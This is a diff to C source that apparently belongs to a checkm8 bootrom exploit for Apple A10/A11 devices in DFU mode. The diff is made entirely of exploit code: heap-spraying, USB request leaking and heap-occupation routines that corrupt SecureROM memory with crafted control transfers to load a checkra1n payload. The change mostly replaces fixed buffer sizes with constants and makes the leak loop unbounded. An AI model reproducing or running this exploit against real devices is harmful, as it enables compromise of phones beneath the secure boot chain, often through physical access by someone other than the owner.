@@ -26,30 +26,32 @@
 #include <io/iousb.h>
 #include <common/common.h>
 
-static unsigned char blank[2048];
+static unsigned char blank[DFU_MAX_TRANSFER_SZ];
 
 static void heap_spray(io_client_t client)
 {
     transfer_t result;
     UInt32 wLen;
     
-    memset(&blank, '\0', 2048);
+    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
     
-    result = send_data(client, blank, 2048);
+    result = send_data(client, blank, DFU_MAX_TRANSFER_SZ);
     DEBUGLOG("[%s] (1/7) %x", __FUNCTION__, result.ret);
-    usleep(1000);
     
     // for iphoneos devices (especially older ones)
     // repeat forever until usb_req_leak() reaches timeout
-    int i=0;
-    for(i=0;i<16384;i++){
-        wLen = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
+    unsigned int i = 0;
+    while(1) {
+        wLen = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 3 * EP0_MAX_PACKET_SZ, i);
         result = usb_req_leak(client, blank);
-        if(result.ret != kIOReturnSuccess) break;
+        if(result.ret != kIOReturnSuccess)
+            break;
+        i++;
+        DEBUGLOG("[%s] (*) retry: %x", __FUNCTION__, i);
     }
     DEBUGLOG("[%s] (2/7) %x, %d", __FUNCTION__, result.ret, i);
     
-    for(int i=0;i<64;i++){
+    for(int i=0;i<64;i++) {
         result = no_leak(client, blank);
     }
     DEBUGLOG("[%s] (3/7) %x", __FUNCTION__, result.ret);
@@ -75,7 +77,7 @@ static void set_global_state(io_client_t client)
     unsigned int val;
     UInt32 sent = 0;
     
-    memset(&blank, '\x41', 2048);
+    memset(&blank, '\x41', DFU_MAX_TRANSFER_SZ);
     
     val = 1408; // A7/A9X/A10/A10X/A11
     
@@ -86,7 +88,7 @@ static void set_global_state(io_client_t client)
      */
     
     int i=0;
-    while(((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 0)) >= val) || (sent == 0)){
+    while(((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 0)) >= val) || (sent == 0)){
         i++;
         DEBUGLOG("[%s] (*) retry: %x", __FUNCTION__, i);
         usleep(10000);
@@ -110,7 +112,7 @@ static void heap_occupation(io_client_t client, checkra1n_payload_t payload)
 {
     transfer_t result;
     
-    memset(&blank, '\0', 2048);
+    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
     
     result = usb_req_stall(client);
     DEBUGLOG("[%s] (1/6) %x", __FUNCTION__, result.ret);
@@ -141,7 +143,7 @@ int checkm8_t8010_t8015(io_client_t client, checkra1n_payload_t payload)
 {
     int ret = 0;
     
-    memset(&blank, '\0', 2048);
+    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
     
     LOG_EXPLOIT_NAME("checkm8");
     
